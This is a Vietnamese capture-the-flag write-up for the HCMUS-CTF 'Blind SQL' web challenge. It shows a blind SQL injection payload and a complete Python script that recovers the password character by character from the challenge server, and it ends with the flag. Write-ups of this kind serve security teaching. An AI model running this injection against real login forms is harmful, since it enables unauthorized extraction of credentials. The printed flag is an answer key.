# Web Exploitation - Blind SQL

Link: (http://159.65.13.76:1340/)

- Web challenge chỉ có 1 input field cho `username`, với kiểu blindSQLi này thì password là flag luôn

- Ta sẽ dùng SQLi payload sau để kiểm tra x kí tự đầu của password

```
admin' and binary(substring(password,1,x))='PWD
```

- Viết một python script đơn giản để dò password, flag chứa kí tự `A-Z`, `a-z`, `0-9`, `{}_`

```python
import requests 

dict = '}0123456789-_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'

def query(flag, index):

    URL = 'http://159.65.13.76:1340/'

    if index == len(dict):
        print("NOT FOUND")
        exit(0)

    payload = "admin' and binary(substring(password,1," + str(len(flag)+1) + "))='" + flag + dict[index]

    data = {
        'username': payload
    }

    r = requests.post(url = URL, data = data)

    print(payload)

    response = r.text
    if ('Cannot' in response):
        query(flag, index + 1)# not matched
    else:
        flag = flag + dict[index]
        print("** FOUND ** ", flag)
        query(flag, 0) # matched

query('HCMUS-CTF{', 0)
```

Flag `HCMUS-CTF{Sh0uld_I_Us3_NoSQL_N3xt_T1m3_0x3f3f3f}`